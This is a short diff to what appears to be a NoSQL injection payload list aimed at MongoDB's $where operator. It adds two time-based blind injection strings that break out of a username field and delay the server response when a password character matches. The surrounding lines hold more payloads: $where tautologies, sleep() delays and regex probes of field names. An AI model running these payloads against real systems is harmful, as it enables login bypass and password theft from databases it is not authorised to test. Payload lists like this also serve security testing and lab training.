@@ -13,6 +13,8 @@ $where: '1 == 1'
 {"username":"wiener","password":"peter", "$where":"1"}
 {"$where": "sleep(5000)"}
 "$where": "sleep(5000)"
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
 "$where": "Object.keys(this)[0].match(/^a.*/)"
 "$where": "Object.keys(this)[0].length == 1"
